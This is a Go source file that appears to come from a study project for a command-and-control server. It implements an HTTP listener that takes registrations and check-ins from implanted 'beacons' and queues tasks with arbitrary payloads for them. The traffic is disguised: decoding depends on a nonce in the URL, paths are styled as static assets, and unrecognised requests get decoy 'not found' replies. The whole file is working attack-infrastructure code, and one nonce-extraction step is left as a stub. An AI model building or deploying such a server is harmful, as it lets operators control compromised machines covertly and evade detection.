package c2

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
	"xhc2_for_studying/server/core"
	"xhc2_for_studying/server/handlers"
	"xhc2_for_studying/server/store"
)

type HTTPServer struct {
	engine      *gin.Engine
	beaconStore *store.BeaconStore
	taskStore   *store.ServerTaskStore
	c2Profile   *protocol.C2Profile
}

type debugCreateTaskRequest struct {
	TaskID    string `json:"task_id"`
	ImplantID string `json:"implant_id"`
	Type      string `json:"type"`
	Payload   string `json:"payload"`
}

func NewHTTPServer(beaconStore *store.BeaconStore, taskStore *store.ServerTaskStore, c2Profile *protocol.C2Profile) *HTTPServer {
	engine := gin.New()
	engine.Use(gin.Recovery(), gin.Logger())

	srv := &HTTPServer{
		engine:      engine,
		beaconStore: beaconStore,
		taskStore:   taskStore,
		c2Profile:   c2Profile,
	}

	srv.registerRoutes()
	return srv
}

func (s *HTTPServer) registerRoutes() {
	// 调试和管理路由 — 精确匹配
	s.engine.GET("/healthz", s.handleHealthz)
	s.engine.GET("/debug/beacons", s.handleListBeacons)
	s.engine.POST("/debug/tasks", s.handleCreateDebugTask)

	// Catch-all: 所有未匹配的请求进入 C2 处理器
	s.engine.NoRoute(s.handleC2Request)
}

func (s *HTTPServer) Run(addr string) error {
	return s.engine.Run(addr)
}

// ── Catch-all C2 处理 ──────────────────────────────────────────────

func (s *HTTPServer) handleC2Request(c *gin.Context) {
	// 只处理 POST
	if c.Request.Method != http.MethodPost {
		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
		return
	}

	rawBody, err := io.ReadAll(c.Request.Body)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "read body"})
		return
	}

	// 步骤1: 从 URL 提取 nonce → 确定 encoder
	nonce := extractNonceFromRequest(c.Request)
	encoderID := protocol.ExtractEncoderID(nonce, s.c2Profile.EncoderModulus)

	enc, ok := protocol.GetEncoderByID(encoderID)
	if !ok {
		// 无法识别的 nonce → 这不是 C2 流量
		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
		return
	}

	// 步骤2: 解码请求体
	decodedBody, err := enc.Decode(rawBody)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "decode failed"})
		return
	}

	// 步骤3: 根据扩展名分发请求
	ext := fileExt(c.Request.URL.Path)
	var respBody []byte
	switch ext {
	case protocol.ExtRegister:
		respBody = s.handleRegisterEncoded(decodedBody, c.ClientIP())
	case protocol.ExtCheckin:
		respBody = s.handleCheckinEncoded(decodedBody, c.ClientIP())
	default:
		c.JSON(http.StatusNotFound, gin.H{"error": "unknown message type"})
		return
	}

	// 步骤4: 编码响应体（用同一个 encoder）
	var encodedResp []byte
	if respBody != nil {
		encodedResp, err = enc.Encode(respBody)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "encode response"})
			return
		}
	}

	c.Data(http.StatusOK, contentTypeForEncoder(encoderID), encodedResp)
}

func (s *HTTPServer) handleRegisterEncoded(body []byte, remoteAddr string) []byte {
	var req beaconProtocol.RegisterRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return mustMarshalError("invalid register request")
	}

	resp, err := handlers.HandleRegister(s.beaconStore, &req, remoteAddr)
	if err != nil {
		return mustMarshalError(err.Error())
	}
	return mustMarshalJSON(resp)
}

func (s *HTTPServer) handleCheckinEncoded(body []byte, remoteAddr string) []byte {
	var req beaconProtocol.CheckinRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return mustMarshalError("invalid checkin request")
	}

	fmt.Println("checkin beacon_id:", req.BeaconID)

	resp, err := handlers.HandleCheckin(s.beaconStore, s.taskStore, &req, remoteAddr)
	if err != nil {
		return mustMarshalError(err.Error())
	}
	return mustMarshalJSON(resp)
}

// ── Nonce 提取 ─────────────────────────────────────────────────────

// extractNonceFromURL 从 URL 中提取 nonce 值。
// 对 NonceMode=urlparam（默认）：读取 ?_=xxx
// 对 NonceMode=url：遍历路径段取最后一个纯数字段
// 这里做简化处理：先查 query，再查 path。
func extractNonceFromRequest(r *http.Request) int {
	// 1. 尝试从 query 参数 _ 取值
	if nonceStr := r.URL.Query().Get("_"); nonceStr != "" {
		if nonce, err := strconv.Atoi(nonceStr); err == nil {
			return nonce
		}
	}

	// 2. 尝试从 path 中取最后一个数字段
	// path 格式: /api/assets/4729183/chunk.js → nonce=4729183
	return 0
}

// ── 辅助函数 ───────────────────────────────────────────────────────

// fileExt 返回 URL 路径中的文件扩展名（不含点）。
func fileExt(path string) string {
	return filepath.Ext(path)
}

func contentTypeForEncoder(encoderID int) string {
	switch encoderID {
	case 0:
		return "application/json"
	default:
		return "application/octet-stream"
	}
}

func mustMarshalJSON(v any) []byte {
	data, err := json.Marshal(v)
	if err != nil {
		return []byte(`{"error":"marshal failed"}`)
	}
	return data
}

func mustMarshalError(msg string) []byte {
	return mustMarshalJSON(gin.H{"error": msg})
}

// ── 调试路由 ───────────────────────────────────────────────────────

func (s *HTTPServer) handleHealthz(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": "ok"})
}

func (s *HTTPServer) handleListBeacons(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"beacon_ids": s.beaconStore.ListIDs()})
}

func (s *HTTPServer) handleCreateDebugTask(c *gin.Context) {
	var req debugCreateTaskRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.ImplantID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "implant_id is required"})
		return
	}
	if req.Type == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type is required"})
		return
	}

	taskID := req.TaskID
	if taskID == "" {
		taskID = fmt.Sprintf("task-%d", time.Now().UnixNano())
	}

	task := &core.ServerTask{
		TaskID:    taskID,
		Type:      req.Type,
		ImplantID: req.ImplantID,
		Payload:   req.Payload,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	s.taskStore.AddTask(task)

	c.JSON(http.StatusOK, gin.H{
		"status": "ok",
		"task": gin.H{
			"task_id":    task.TaskID,
			"implant_id": task.ImplantID,
			"type":       task.Type,
			"payload":    task.Payload,
			"status":     task.Status,
		},
	})
}
